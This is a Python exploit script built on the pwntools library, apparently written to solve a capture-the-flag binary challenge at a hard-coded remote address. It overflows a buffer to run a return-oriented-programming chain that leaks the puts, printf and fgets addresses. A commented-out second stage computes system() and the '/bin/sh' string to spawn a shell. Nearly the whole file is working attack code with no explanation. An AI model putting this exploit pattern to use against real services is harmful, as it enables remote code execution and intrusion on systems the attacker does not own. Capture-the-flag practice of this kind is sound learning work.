#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'chall')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
break * 0x000000000040115a
c
'''.format(**locals())

io = remote('3.85.17.84', 1278)

poprdi = 0x000000000040115a
putsplt = 0x401030

printfgot = 0x404008
putsgot = 0x404000
fgetsgot = 0x404010

retgadget = poprdi + 1

payload = flat({
    24: [
        poprdi, putsgot,
        putsplt,
        poprdi, printfgot,
        putsplt,
        poprdi, fgetsgot,
        putsplt,
        exe.sym.main
    ]
})

io.sendline(payload)

io.readuntil(b': ');

puts_add = io.read(7)[:-1]
puts_add = int(puts_add[::-1].hex(), 16)
printf_add = io.read(7)[:-1]
printf_add = int(printf_add[::-1].hex(), 16)
fgets_add = io.read(7)[:-1]
fgets_add = int(fgets_add[::-1].hex(), 16)

print("puts", hex(puts_add))
print("printf", hex(printf_add))
print("fgets", hex(fgets_add))

# puts_base_add = 0x77980
# base_add = puts_add - puts_base_add

# system = 0x4c490 + base_add
# str_bin_sh = 0x197031 + base_add

# payload = flat({
#     24: [
#         poprdi, str_bin_sh,
#         retgadget,
#         system
#     ]
# })

# print("system", hex(system))
# print("str_bin_sh", hex(str_bin_sh))

# io.sendline(payload)

io.interactive()
